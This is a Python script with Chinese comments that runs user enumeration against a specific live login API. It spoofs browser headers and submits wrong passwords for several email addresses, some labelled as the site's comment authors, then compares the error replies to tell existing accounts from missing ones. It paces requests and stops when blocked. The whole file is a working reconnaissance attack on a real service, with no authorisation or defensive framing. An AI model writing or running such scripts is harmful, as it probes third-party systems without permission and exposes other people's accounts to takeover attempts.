# -*- coding: utf-8 -*-
"""用户枚举: 登录错误响应差异(账号不存在 vs 密码错误) + 邮箱格式验证"""

import urllib.request, json, time, sys, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1

tests = [
    ("自己账号-错密码", {"email": "3124323585@qq.com", "password": "WrongPass1!"}),
    ("不存在邮箱-qq", {"email": "999999999@qq.com", "password": "WrongPass1!"}),
    ("评论作者-qq", {"email": "846851493@qq.com", "password": "WrongPass1!"}),
    ("评论作者-163", {"email": "846851493@163.com", "password": "WrongPass1!"}),
    ("评论作者-gmail", {"email": "846851493@gmail.com", "password": "WrongPass1!"}),
    ("评论作者2-qq", {"email": "724288338@qq.com", "password": "WrongPass1!"}),
    ("用户名登录?", {"username": "846851493", "password": "WrongPass1!"}),
    ("纯数字用户名", {"username": "3124323585", "password": "WrongPass1!"}),
]
for name, data in tests:
    st, b = req("POST", "/api/user/login", data)
    log("%s: %s %s" % (name, st, b[:200].replace("\n", " ")))
    time.sleep(0.4)
    if st == 403:
        log("窗口关")
        raise SystemExit

with open("ue_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("user enum shard%d done" % shard)
